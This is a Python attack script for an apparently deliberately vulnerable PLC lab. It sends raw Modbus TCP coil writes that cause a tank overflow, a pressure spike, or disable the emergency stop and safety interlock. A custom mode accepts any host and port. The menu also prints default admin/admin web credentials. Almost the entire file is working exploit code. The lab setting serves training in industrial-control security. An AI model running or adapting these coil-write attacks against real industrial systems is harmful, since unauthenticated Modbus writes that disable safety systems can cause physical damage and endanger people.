#!/usr/bin/env python3
"""
Simple attack script - no modbus-cli needed!
Usage: python3 attack.py
"""
import socket
import struct
import sys

def modbus_write_coil(host, port, coil, value):
    """Write a single coil via Modbus TCP"""
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((host, port))

        # Build Modbus request
        transaction_id = 1
        protocol_id = 0
        length = 6
        unit_id = 1
        function_code = 0x05  # Write Single Coil
        coil_address = coil
        coil_value = 0xFF00 if value else 0x0000

        # MBAP Header + PDU
        request = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id)
        request += struct.pack('>BHH', function_code, coil_address, coil_value)

        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        # Check response
        if len(response) >= 12 and response[7] == 0x05:
            return True, "Success"
        else:
            return False, f"Unexpected response: {response.hex()}"

    except Exception as e:
        return False, str(e)

def print_menu():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  Vuln-PLC Attack Tool                                        ║
║  Watch the visual alerts in the web UI!                     ║
╚══════════════════════════════════════════════════════════════╝

Choose an attack:

1. Tank Overflow (PLC-1)
   - Turn pump ON
   - Close drain valve
   - Watch tank level rise!

2. Pressure Spike (PLC-2)
   - Turn compressor ON
   - Close relief valve
   - Watch pressure increase!

3. Safety System Bypass (PLC-4) 🚨 CRITICAL
   - Disable emergency stop
   - Disable safety interlock
   - Watch RED PULSING ALERT!

4. Custom attack
5. Exit

Open web UI first: http://localhost:5000/process (admin/admin)
""")

if __name__ == '__main__':
    while True:
        print_menu()
        choice = input("Enter choice (1-5): ").strip()

        if choice == '1':
            print("\n[Attack 1] Tank Overflow Attack")
            print("  Step 1: Turning pump ON...")
            success, msg = modbus_write_coil('127.0.0.1', 5502, 0, True)
            print(f"    {'✓' if success else '✗'} {msg}")

            print("  Step 2: Closing drain valve...")
            success, msg = modbus_write_coil('127.0.0.1', 5502, 3, False)
            print(f"    {'✓' if success else '✗'} {msg}")

            print("\n  ⚠️  Check web UI - you should see WARNING alerts!")
            input("\nPress Enter to continue...")

        elif choice == '2':
            print("\n[Attack 2] Pressure Spike Attack")
            print("  Step 1: Turning compressor ON...")
            success, msg = modbus_write_coil('127.0.0.1', 5503, 0, True)
            print(f"    {'✓' if success else '✗'} {msg}")

            print("  Step 2: Closing relief valve...")
            success, msg = modbus_write_coil('127.0.0.1', 5503, 4, False)
            print(f"    {'✓' if success else '✗'} {msg}")

            print("\n  ⚠️  Check web UI - you should see WARNING alerts!")
            input("\nPress Enter to continue...")

        elif choice == '3':
            print("\n[Attack 3] Safety System Bypass - 🚨 CRITICAL 🚨")
            print("  Step 1: Disabling emergency stop...")
            success, msg = modbus_write_coil('127.0.0.1', 5505, 0, False)
            print(f"    {'✓' if success else '✗'} {msg}")

            print("  Step 2: Disabling safety interlock...")
            success, msg = modbus_write_coil('127.0.0.1', 5505, 1, False)
            print(f"    {'✓' if success else '✗'} {msg}")

            print("\n  🚨 Check web UI - RED PULSING CRITICAL ALERT should appear!")
            input("\nPress Enter to continue...")

        elif choice == '4':
            print("\n[Custom Attack]")
            try:
                host = input("  Host (default: 127.0.0.1): ").strip() or '127.0.0.1'
                port = int(input("  Port (5502-5505): ").strip())
                coil = int(input("  Coil address (0-10): ").strip())
                value_str = input("  Value (ON/OFF): ").strip().upper()
                value = value_str in ['ON', '1', 'TRUE']

                print(f"\n  Executing attack on {host}:{port} coil {coil} = {value}...")
                success, msg = modbus_write_coil(host, port, coil, value)
                print(f"    {'✓' if success else '✗'} {msg}")

                print("\n  Check web UI for alerts!")
                input("\nPress Enter to continue...")

            except ValueError as e:
                print(f"  ✗ Invalid input: {e}")
                input("\nPress Enter to continue...")

        elif choice == '5':
            print("\nExiting...")
            break

        else:
            print("\n✗ Invalid choice. Please enter 1-5.")
            input("\nPress Enter to continue...")
